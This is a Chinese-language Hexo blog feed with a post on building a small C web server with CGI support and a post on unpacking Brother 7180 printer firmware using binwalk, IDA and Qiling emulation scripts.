<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-03-14T06:41:29.851Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>linux服务器开发学习</title>
    <link href="http://example.com/2024/01/15/linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/01/15/linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-01-15T02:33:10.000Z</published>
    <updated>2024-03-14T06:41:29.851Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-项目需求"><a href="#1-项目需求" class="headerlink" title="1.项目需求"></a>1.项目需求</h2><p>使用C语言作为开发语言实现了一个简易的webserver——shttpd，实现的功能有：</p><ul><li>select IO多路复用</li><li>动态配置</li><li>CGI支持</li><li>HTTP1.1支持</li><li>静态网页响应</li><li>文件下载</li></ul><h2 id="2-项目实现"><a href="#2-项目实现" class="headerlink" title="2.项目实现"></a>2.项目实现</h2><h4 id="2-1-项目架构"><a href="#2-1-项目架构" class="headerlink" title="2.1.项目架构"></a>2.1.项目架构</h4><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403132215805.png" alt="架构"></p><h4 id="2-2-动态配置"><a href="#2-2-动态配置" class="headerlink" title="2.2 动态配置"></a>2.2 动态配置</h4><p>shttpd使用命令行函数getopt_long接受简易的参数设定，如web根目录，cgi目录，开放端口以及最大客户端数量。</p><h4 id="2-3-启动服务器"><a href="#2-3-启动服务器" class="headerlink" title="2.3 启动服务器"></a>2.3 启动服务器</h4><p>通过socket-bind-listen-accept启动服务器</p><h4 id="2-4-网络事件处理"><a href="#2-4-网络事件处理" class="headerlink" title="2.4 网络事件处理"></a>2.4 网络事件处理</h4><p>使用select处理网络事件请求，为每一个请求分配一个子进程进行处理，如果此时子进程的数量大于预设的最大值就sleep，暂不处理请求；在父进程中使用waitpid回收子进程，父进程永不退出。</p><h4 id="2-5-HTTP请求解析"><a href="#2-5-HTTP请求解析" class="headerlink" title="2.5 HTTP请求解析"></a>2.5 HTTP请求解析</h4><p>使用fgets遇到\n就停止读取的特性，循环读取HTTP请求的每一行，以空格将每一行进行分割提取值，并判断其是否合法；由于对于每个网络请求都分配一个子进程，因此使用全局变量来保存读取到的HTTP请求头的值，无需担心不同进程间出现干扰。提取完所有的请求头之后，判断请求方式，如果是POST请求则根据content-length字段的值来读取相应大小的content；接下来判断url是否为cgi请求，如果是普通文件则进入到文件发送的流程，如果为cgi请求则进入到cgi处理流程。</p><h5 id="2-5-1-文件发送流程"><a href="#2-5-1-文件发送流程" class="headerlink" title="2.5.1 文件发送流程"></a>2.5.1 文件发送流程</h5><p>在文件发送流程中，首先根据请求的文件类型设定好响应头中的content-type；然后生成ETAG字段，比较请求头中的ETAG字段和此时生成的ETAG字段是否相同，相同的话则发送<code>Not Modified</code>响应；如果请求头中存在IfModifiedSince字段，则解析该字段为unix时间戳，和请求文件的最后修改时间戳进行比较，如果请求文件的最后修改时间戳大于等于<code>IfModifiedSince</code>字段的时间戳，则也发送<code>Not Modified</code>响应；接下来再打开请求文件，如果有<code>Range</code>字段，则根据Range字段发送相应大小的文件数据，如果没有则完整发送文件；发送文件使用<code>sendfile</code>零拷贝函数，直接在内核中进行拷贝，避免在用户态和内核态之间操作数据，提高效率。</p><h5 id="2-5-2-CGI处理流程"><a href="#2-5-2-CGI处理流程" class="headerlink" title="2.5.2 CGI处理流程"></a>2.5.2 CGI处理流程</h5><p>如果是cgi请求，首先创建一个读管道in[2]，一个写管道out[2]，然后fork出子进程，子进程也会继承读写管道。</p><p>父进程将数据通过管道发送给cgi子进程，cgi子进程处理完请求之后通过管道将结果写回给父进程，管道示意图如下所示</p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403141333119.png" alt="管道" style="zoom:150%;" /><p>上图是fork出子进程之后的管道图，还需要关闭不需要的管道描述符。</p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403141339366.png" alt="管道2" style="zoom:150%;" /><p>这里的In和Out两个管道都是相对于子进程而言的，将子进程的In的读端重定向到标准输入，将写端重定向到标准输出，这样就可以通过printf等标准输出输入函数直接从父进程中读取数据或者往父进程中写入数据。</p><p>CGI程序从环境变量中获取数据，因此在执行cgi之前，还需要设置好环境变量，然后调用execl系列函数启动cgi程序</p><h2 id="3-项目效果"><a href="#3-项目效果" class="headerlink" title="3.项目效果"></a>3.项目效果</h2><p>项目内嵌了3个html页面和一个用于测试的cgi程序，访问默认端口会返回index.html页面</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403141406164.png" alt="image-20240314140605332"></p><p>访问download.html会返回下载页面，点击下载链接会下载一个压缩包</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403141407395.png" alt="image-20240314140720040"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403141408581.png" alt="image-20240314140827736"></p><p>访问calc.html用于调用后端的cgi</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403141409303.png" alt="image-20240314140903213"></p><p>cgi实现了简单的加减法功能，计算完毕后会将结果返回到浏览器中</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403141409818.png" alt="image-20240314140940317"></p><h2 id="4-压力测试"><a href="#4-压力测试" class="headerlink" title="4.压力测试"></a>4.压力测试</h2><p>使用webbench进程压力测试</p><p>使用7000并发量测试30s，存在9个failed</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240314141700941.png" alt="image-20240314141700941"></p><p>使用7000并发量测试10s，全部通过</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403141419382.png" alt="image-20240314141903412"></p><p>也可以通过-m参数指定webserver的最大并发量，默认是50，将其设置为100</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403141424248.png" alt="image-20240314142359816"></p><p>有所提升，不过并发量不能设置太大，因为每一个并发都是一个子进程，对系统资源是很大的占用。</p><h2 id="5-系统资源占用"><a href="#5-系统资源占用" class="headerlink" title="5.系统资源占用"></a>5.系统资源占用</h2><p>没有访问的情况下，shttpd对CPU资源的占用量极低</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403141438406.png" alt="image-20240314143822936"></p><p>在使用webbench测试时，占用量如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403141437612.png" alt="image-20240314143750925"></p><p>限制shttpd并发量为100，webbench并发量为7000。</p><p>可以看到对于内存的占用实际上也没有那么多，从2.20G增长到了2.32G</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-项目需求&quot;&gt;&lt;a href=&quot;#1-项目需求&quot; class=&quot;headerlink&quot; title=&quot;1.项目需求&quot;&gt;&lt;/a&gt;1.项目需求&lt;/h2&gt;&lt;p&gt;使用C语言作为开发语言实现了一个简易的webserver——shttpd，实现的功能有：&lt;/p&gt;
&lt;ul&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>兄弟7180分析</title>
    <link href="http://example.com/2024/01/09/%E5%85%84%E5%BC%9F7180%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2024/01/09/%E5%85%84%E5%BC%9F7180%E5%88%86%E6%9E%90/</id>
    <published>2024-01-09T13:32:22.000Z</published>
    <updated>2024-03-14T06:43:36.712Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-固件提取"><a href="#1-固件提取" class="headerlink" title="1.固件提取"></a>1.固件提取</h2><p>咸鱼上淘了一块板子，直接吹下flash提取，8pin SPI flash，16MB</p><h2 id="2-固件分析"><a href="#2-固件分析" class="headerlink" title="2.固件分析"></a>2.固件分析</h2><p>binwalk分析</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230729103800372.png" alt="image-20230729103800372"></p><p>结果非常混乱，推测为RTOS固件</p><p>查看一下字节序</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230729104049274.png" alt="image-20230729104049274"></p><p>大端序，再查看一下熵值</p><p>binwalk -E </p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230730150705717.png" alt="image-20230730150705717"></p><p>可以看到有几部分具有很高的熵值，可能是被压缩了，也可能是混淆状态。</p><p>被压缩的固件是无法直接运行的，固件中肯定存在某个部分是用于解压缩的，固件需要能够自举。</p><p>大的设备可能会有一个专门的flash用于存放bootloader进行初始化操作，其中就会包含解压缩或者解混淆等操作；而对于本设备只有一个flash，那么bootloader和业务逻辑的固件都是一起的。看到熵值图，其中也有不少熵值较低的。</p><p>直接用IDA打开固件</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230730152326616.png" alt="image-20230730152326616"></p><p>IDA没有进行任何分析。注意，此时我们没有设置固件的加载地址，因此默认加载地址为0，在0地址处解析固件</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230730152934005.png" alt="image-20230730152934005"></p><p>解析出了一些代码，不过这些代码是以0地址为基址解析出来的，不一定正确，需要进一步分析之后才能够确定。</p><p>0地址处是一个跳转指令，跳转到了0x40处执行，看到0x40处的函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230730154105496.png" alt="image-20230730154105496"></p><p>这个函数中执行了大量的初始化操作，由于很多地址在IDA中没有映射，所以显示为红色</p><p>在最后面有几个函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230730160039485.png" alt="image-20230730160039485"></p><p>首先看到<code>sub_E54</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230730160106047.png" alt="image-20230730160106047"></p><p>这个函数从<code>0xA000BA78</code>开始的<code>0x6370</code>个字节进行清空操作。</p><p>再看到<code>sub_B46</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230730161217228.png" alt="image-20230730161217228"></p><p>同样的函数调用了两次</p><p>看到<code>sub_A94</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230730161323129.png" alt="image-20230730161323129"></p><p>a2是<code>0xA0001000</code>，a3是<code>0x7D6B</code>，a1是<code>0xF2C</code>，<code>0xF2C</code>指向的地址中存在大量数据</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403092042679.png" alt="image-20230730161419895"></p><p>这个函数执行的操作大致就是将<code>0xF2C</code>这个地址中的数据经过一系列操作后，存放到<code>0xA0001000</code>中，长度为0x7D6B</p><p>第二个<code>sub_A94</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/202403092042129.png" alt="image-20230730162225791"></p><p>将0x8c9b处的数据处理后存放到0xA000B750，长度为<code>unk_8C9A + (unk_8C99 &lt;&lt; 8) + (unk_8C98 &lt;&lt; 16) + (unk_8C97 &lt;&lt; 24)</code></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230730162326899.png" alt="image-20230730162326899"></p><p>经计算后得到长度为<code>0x1c2</code>.</p><p>我们需要想办法得到经<code>sub_A94</code>处理后的数据。通常而言，可以将处理数据的函数的伪代码抄下来稍微修改一下使其能够运行，不过由于这个函数有些复杂，修改伪c代码可能会导致函数失真，所以我采取另一种方法：使用qiling框架对代码进行部分模拟。</p><p>qiling框架是对unicorn的封装，用于模拟固件非常合适。</p><p>正常而言使用qiling模拟RTOS固件需要创建一个配置文件，用于指定各个区段，而且也不一定能运行成功；一种相对简单且成功率高的方法就是使用qiling运行一段目标固件架构的shellcode或者代码，将固件读取到内存中，添加区段映射，然后再从shellcode中跳转到固件中执行即可。</p><p>首先来确定我们要模拟的函数要从哪开始执行</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230730164222487.png" alt="image-20230730164222487"></p><p>在<code>0x00000434</code>处执行了<code>BLX   sub_B46</code>指令，跳转执行<code>sub_B46</code>，并切换为thumb模式；下一行指令的地址为<code>0x00000438</code>，也就是执行完数据处理函数后会跳回来继续执行，所以要模拟的函数的开始地址为<code>0x00000434</code>，结束地址为<code>0x0000438</code>。</p><p>编写如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.endian=<span class="string">&#x27;big&#x27;</span></span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_ARCH</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_ENDIAN</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_OS</span><br><span class="line"></span><br><span class="line">decompress_func=<span class="number">0x00000434</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook1</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.arch.regs.arch_pc=decompress_func</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook2</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    length=ql.arch.regs.read(<span class="string">&#x27;r2&#x27;</span>)</span><br><span class="line">    ql.log.info(<span class="string">&quot;size:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(length)))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook3</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ram1.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data=ql.mem.read(<span class="number">0xA0001000</span>,<span class="number">0xaa80</span>)</span><br><span class="line">        f.write(data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ram2.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data=ql.mem.read(<span class="number">0xA000B750</span>,<span class="number">0x1000</span>)</span><br><span class="line">        f.write(data)</span><br><span class="line">    ql.stop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    shellcode=asm(shellcraft.thumb.infloop())</span><br><span class="line">    ql=Qiling(code=shellcode,ostype=QL_OS.LINUX,archtype=QL_ARCH.ARM,endian=QL_ENDIAN.EB</span><br><span class="line">              ,verbose=QL_VERBOSE.DEBUG,thumb=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./brother_7180.BIN&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        firm=f.read() </span><br><span class="line">    firm_size=<span class="built_in">len</span>(firm)</span><br><span class="line">    ql.log.info(<span class="string">&quot;firmware size: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(firm_size)))</span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0</span>,firm_size,info=<span class="string">&quot;[flash]&quot;</span>)</span><br><span class="line">    ql.mem.write(<span class="number">0</span>,firm)</span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0xA0000000</span>,<span class="number">0x1000000</span>,info=<span class="string">&quot;[ram]&quot;</span>)</span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0x20000000</span>, <span class="number">0x10000000</span>, info=<span class="string">&quot;[STACK]&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> info_line <span class="keyword">in</span> ql.mem.get_formatted_mapinfo():</span><br><span class="line">        ql.log.debug(info_line)</span><br><span class="line">    ql.hook_address(hook1,<span class="number">0x011ff000</span>)</span><br><span class="line">    ql.hook_address(hook2,<span class="number">0x00000B90</span>)</span><br><span class="line">    ql.hook_address(hook3,<span class="number">0x00000438</span>)</span><br><span class="line">    ql.arch.regs.arch_sp=<span class="number">0x2f000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ql.run()</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用pwntools生成一段arm的thumb模式的shellcode，让qiling运行这段shellcode，将固件映射到0地址处，在<code>0xA0000000</code>处映射一段内存，用于存放数据，在<code>0x20000000</code>处也映射一段内存，用于栈空间。</p><p>设置了3个hook函数，hook1用于从shellcode跳转到固件中执行；hook3用于在执行完毕后将数据从内存中读出来并写入到文件中，然后结束运行。</p><p>需要注意的是，由于是thumb模式，函数地址需要比真实地址+1.</p><p>运行截图如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230730172412517.png" alt="image-20230730172412517"></p><p>运行之后得到了两个文件</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230730165626572.png" alt="image-20230730165626572"></p><p>然后在将得到的这两个文件附加到IDA中，并映射到指定地址</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230731203901787.png" alt="image-20230731203901787"></p><p>然后继续往后看，看到<code>sub_C98</code>函数，sub_c98函数中调用的函数都是调用的我们刚刚解压出来的数据中的函数，所以如果我们没有完成上一步的解压操作那么就无法继续往后分析。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230731204028500.png" alt="image-20230731204028500"></p><p>不过很遗憾，这些函数相当难看，让人一头雾水，根据之前分析canon打印机的经验，在这段操作中应该会将另一部分固件解压缩到内存中的函数，但我翻了好几遍之后也没找到类似的函数，分析陷入僵局。</p><p>后面发现，程序调用了多次<code>sub_A0008150</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230830171657691.png" alt="image-20230830171657691"></p><p>这个函数有三个参数，主要功能就是将第一个参数的字符串和内存中的一块函数表的函数名进行对比，如果匹配就进行调用，函数表如下图所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230830171819827.png" alt="image-20230830171819827"></p><p>一开始我没有意识到</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230830172004053.png" alt="image-20230830172004053"></p><p>这些是函数指针，浪费了许多时间。</p><p>回看到最后一行代码</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230830172038973.png" alt="image-20230830172038973"></p><p><code>PrgStart</code>对应的函数如下图所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230830172233924.png" alt="image-20230830172233924"></p><p>看到sub_A45C函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230830172410076.png" alt="image-20230830172410076"></p><p>这个函数的i应该是一个整数，0x23c588，循环将0xA0850498开始，长度为0x23c588的内存清0</p><p>继续看到sub_A296函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230830172746289.png" alt="image-20230830172746289"></p><p>又看到了sub_A1E4这个解压缩函数，我们依然使用qiling进行模拟执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.endian=<span class="string">&#x27;big&#x27;</span></span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_ARCH</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_ENDIAN</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_OS</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UC_PROT_ALL</span><br><span class="line"></span><br><span class="line">decompress_func_call_addr=<span class="number">0x0000A297</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook1</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.arch.regs.arch_pc=decompress_func_call_addr</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook2</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    length=ql.arch.regs.read(<span class="string">&#x27;r2&#x27;</span>)</span><br><span class="line">    ql.log.info(<span class="string">&quot;size:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(length)))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook3</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ram3.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data=ql.mem.read(<span class="number">0xA0420000</span>,<span class="number">0xdbe8</span>)</span><br><span class="line">        f.write(data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ram4.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data=ql.mem.read(<span class="number">0xA042DBE8</span>,<span class="number">0x1000</span>)</span><br><span class="line">        f.write(data)</span><br><span class="line">    ql.stop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    shellcode=asm(shellcraft.thumb.infloop())</span><br><span class="line">    ql=Qiling(code=shellcode,ostype=QL_OS.LINUX,archtype=QL_ARCH.ARM,endian=QL_ENDIAN.EB</span><br><span class="line">              ,verbose=QL_VERBOSE.DEBUG,thumb=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./brother_7180.BIN&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        firm=f.read() </span><br><span class="line">    firm_size=<span class="built_in">len</span>(firm)</span><br><span class="line">    ql.log.info(<span class="string">&quot;firmware size: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(firm_size)))</span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0</span>,firm_size,info=<span class="string">&quot;[flash]&quot;</span>)</span><br><span class="line">    ql.mem.write(<span class="number">0</span>,firm)</span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0xA0000000</span>,<span class="number">0x10000000</span>,info=<span class="string">&quot;[ram]&quot;</span>)</span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0xe0000000</span>,<span class="number">0x10000000</span>,info=<span class="string">&quot;[ram]&quot;</span>)</span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0x20000000</span>, <span class="number">0x10000000</span>, info=<span class="string">&quot;[STACK]&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> info_line <span class="keyword">in</span> ql.mem.get_formatted_mapinfo():</span><br><span class="line">        ql.log.debug(info_line)</span><br><span class="line">    ql.hook_address(hook1,<span class="number">0x011ff000</span>)</span><br><span class="line">    ql.hook_address(hook2,<span class="number">0x0000A2BC</span>)</span><br><span class="line">    ql.hook_address(hook2,<span class="number">0x0000A2E4</span>)</span><br><span class="line">    ql.hook_address(hook3,<span class="number">0x0000A2E8</span>)</span><br><span class="line">    ql.arch.regs.arch_sp=<span class="number">0x2f000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ql.run()</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>然后将生成的固件加载到IDA中，继续往下看</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230830173738021.png" alt="image-20230830173738021"></p><p>看到sub_A4D0函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230830173937610.png" alt="image-20230830173937610"></p><p>看到<code>sub_A04210AC</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230830174005096.png" alt="image-20230830174005096"></p><p>很明显的解压缩函数,这里实际上就是zlib的压缩方式</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230830200734337.png" alt="image-20230830200734337"></p><p>开头是压缩数据的长度，后面跟着的就是zlib的压缩数据。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230830200916526.png" alt="image-20230830200916526"></p><p>这行代码猜测就是对上图中的zlib数据进行解压缩，然后加载到0xA042DBF4中</p><p>下面的<img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230830201201038.png" alt="image-20230830201201038">也是一样的功能，其实这两块zlib压缩数据是连在一起的，前一块zlib压缩数据的起始地址加上长度就能找到第二块zlib数据，第二块的长度为0x10f53，解压缩后将被加载到<code>0xA08180DC</code></p><p><strong>未完待续……</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-固件提取&quot;&gt;&lt;a href=&quot;#1-固件提取&quot; class=&quot;headerlink&quot; title=&quot;1.固件提取&quot;&gt;&lt;/a&gt;1.固件提取&lt;/h2&gt;&lt;p&gt;咸鱼上淘了一块板子，直接吹下flash提取，8pin SPI flash，16MB&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>刷题记录</title>
    <link href="http://example.com/2024/01/09/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://example.com/2024/01/09/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2024-01-09T13:32:02.000Z</published>
    <updated>2024-03-10T03:54:37.607Z</updated>
    
